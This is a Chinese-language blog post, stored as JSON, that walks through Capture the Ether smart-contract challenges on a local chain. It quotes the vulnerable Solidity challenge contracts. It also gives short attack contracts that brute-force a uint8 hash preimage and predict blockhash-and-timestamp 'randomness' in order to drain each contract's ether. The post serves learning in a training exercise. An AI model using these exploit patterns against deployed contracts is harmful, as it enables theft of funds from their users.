{"title":"Capture the Ether靶场","uid":"0e030f53c4fb86d5302f4b7a9265440a","slug":"Capture the Ether靶场","date":"2023-03-24T15:33:01.000Z","updated":"2023-03-24T15:34:41.977Z","comments":true,"path":"api/articles/Capture the Ether靶场.json","keywords":null,"cover":"https://s2.loli.net/2022/12/17/eOYWR2zZ9rqSchP.jpg","content":"<p>由于Ropsten测试网被弃用了，就在本地测试</p>\r\n<h1 id=\"warmup\">Warmup</h1>\r\n<h2 id=\"deploy-a-contract\">Deploy a contract</h2>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/R3HwfMYkISylQqn.png\" alt=\"image-20230324172346730.png\"></p>\r\n<p>把代码扔remix上部署一下就行了</p>\r\n<h2 id=\"call-me\">Call me</h2>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/yLrvZc9EoFkiWuP.png\" alt=\"image-20230324172529372.png\"></p>\r\n<p>先调用<code>callme()</code>函数，就能通过</p>\r\n<h2 id=\"choose-a-nickname\">Choose a nickname</h2>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/82BpofUYPWRZC3g.png\" alt=\"image-20230324173902267.png\"></p>\r\n<p>在这里随意传入一个<code>bytes32</code>的字符串就ok</p>\r\n<h1 id=\"lotteries\">Lotteries</h1>\r\n<h2 id=\"guess-the-number\">Guess the number</h2>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/gvrmKZhNTwSARa6.png\" alt=\"image-20230324212717068.png\"></p>\r\n<p>首先给这个合约1个<code>ETH</code>，需要用1个<code>ETH</code>猜测42,即可调用<code>transfer</code>清空余额</p>\r\n<h2 id=\"guess-the-secret-number\">Guess the secret number</h2>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.4.21;\r\n\r\ncontract GuessTheSecretNumberChallenge {\r\n    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\r\n\r\n    function GuessTheSecretNumberChallenge() public payable {\r\n        require(msg.value == 1 ether);\r\n    }\r\n    \r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance == 0;\r\n    }\r\n\r\n    function guess(uint8 n) public payable {\r\n        require(msg.value == 1 ether);\r\n\r\n        if (keccak256(n) == answerHash) {\r\n            msg.sender.transfer(2 ether);\r\n        }\r\n    }\r\n}</code></pre>\r\n<p>攻击合约</p>\r\n<pre class=\"solidity\"><code>contract guessit{\r\n    GuessTheSecretNumberChallenge add;\r\n    function guessit(address _addr) public payable{\r\n        add=GuessTheSecretNumberChallenge(_addr);\r\n    }\r\n    uint8 public n;\r\n\r\n    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\r\n    function get(){\r\n    for(uint8 i=0;i&lt;256;i++){\r\n        if(keccak256(i)==answerHash)\r\n        {\r\n            n=i;\r\n            break;\r\n        }\r\n    }\r\n    }   \r\n//        function gueess() external payable{\r\n//        add.guess(n);\r\n//    }     //为什么这边调用会失败？\r\n}</code></pre>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/kKbygR4daXjE1LI.png\" alt=\"image-20230324215329467.png\"></p>\r\n<p><code>uint8</code>数字不大，暴力破解</p>\r\n<p>通过<code>for</code>循环找出那个n，直接用guess方法</p>\r\n<blockquote>\r\n<p>但是用攻击合约来调用原合约的guess方法报错？</p>\r\n</blockquote>\r\n<h2 id=\"guess-the-randon-number\">Guess the randon number</h2>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.4.21;\r\n\r\ncontract GuessTheRandomNumberChallenge {\r\n    uint8 answer;\r\n\r\n    function GuessTheRandomNumberChallenge() public payable {\r\n        require(msg.value == 1 ether);\r\n        answer = uint8(keccak256(block.blockhash(block.number - 1), now));\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance == 0;\r\n    }\r\n\r\n    function guess(uint8 n) public payable {\r\n        require(msg.value == 1 ether);\r\n\r\n        if (n == answer) {\r\n            msg.sender.transfer(2 ether);\r\n        }\r\n    }\r\n}</code></pre>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/KOJixRlGo6QHD3P.png\" alt=\"image-20230324230008329.png\"></p>\r\n<h2 id=\"guess-the-new-number\">Guess the new number</h2>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.4.21;\r\n\r\ncontract GuessTheNewNumberChallenge {\r\n    function GuessTheNewNumberChallenge() public payable {\r\n        require(msg.value == 1 ether);\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance == 0;\r\n    }\r\n\r\n    function guess(uint8 n) public payable {\r\n        require(msg.value == 1 ether);\r\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\r\n\r\n        if (n == answer) {\r\n            msg.sender.transfer(2 ether);\r\n        }\r\n    }\r\n}</code></pre>\r\n<p>攻击代码</p>\r\n<pre class=\"solidity\"><code>contract guessit{\r\n    GuessTheNewNumberChallenge add;\r\n    function guessit(address _addr) public payable{\r\n    add=GuessTheNewNumberChallenge(_addr);\r\n    uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\r\n    add.guess.value(1 ether)(answer);\r\n\r\n    }\r\n}</code></pre>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/c9BmMOFjrl3tZdT.png\" alt=\"image-20230324231348643.png\"></p>\r\n","feature":true,"text":"由于Ropsten测试网被弃用了，就在本地测试 Warmup Deploy a contract 把代码扔remix上部署一下就行了 Call me 先调用callme()函数，就能通过 Choose a nickname 在这里随意传入一个bytes32的字符串就ok Lott...","link":"","photos":[],"count_time":{"symbolsCount":"3k","symbolsTime":"3 mins."},"categories":[],"tags":[{"name":"solidity靶场","slug":"solidity靶场","count":2,"path":"api/tags/solidity靶场.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#warmup\"><span class=\"toc-text\">Warmup</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#deploy-a-contract\"><span class=\"toc-text\">Deploy a contract</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#call-me\"><span class=\"toc-text\">Call me</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#choose-a-nickname\"><span class=\"toc-text\">Choose a nickname</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#lotteries\"><span class=\"toc-text\">Lotteries</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#guess-the-number\"><span class=\"toc-text\">Guess the number</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#guess-the-secret-number\"><span class=\"toc-text\">Guess the secret number</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#guess-the-randon-number\"><span class=\"toc-text\">Guess the randon number</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#guess-the-new-number\"><span class=\"toc-text\">Guess the new number</span></a></li></ol></li></ol>","author":{"name":"cocoZ","slug":"cocoz","avatar":"https://s2.loli.net/2022/12/17/7LdKkiUEVc9wQ1x.jpg","link":"/","description":"想越来越优秀！！！<br/>要变得越来越听话！！！ <br/> @ <b·>QQ:1601760796<b>","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"EVM Puzzles题解","uid":"22c49c6ffbea3c60b8a9bf177b3b8838","slug":"EVM Puzzles题解","date":"2023-03-24T15:32:03.000Z","updated":"2023-03-24T15:34:31.088Z","comments":true,"path":"api/articles/EVM Puzzles题解.json","keywords":null,"cover":"https://s2.loli.net/2022/12/17/eOYWR2zZ9rqSchP.jpg","text":"配置环境 git clone https://github.com/fvictorio/evm-puzzles.git cd evm-puzzles npm install npx hardhat play 输入这两行代码开始做题 cd evm-puzzles npx hardh...","link":"","photos":[],"count_time":{"symbolsCount":"3.6k","symbolsTime":"3 mins."},"categories":[],"tags":[{"name":"EVM","slug":"EVM","count":1,"path":"api/tags/EVM.json"}],"author":{"name":"cocoZ","slug":"cocoz","avatar":"https://s2.loli.net/2022/12/17/7LdKkiUEVc9wQ1x.jpg","link":"/","description":"想越来越优秀！！！<br/>要变得越来越听话！！！ <br/> @ <b·>QQ:1601760796<b>","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}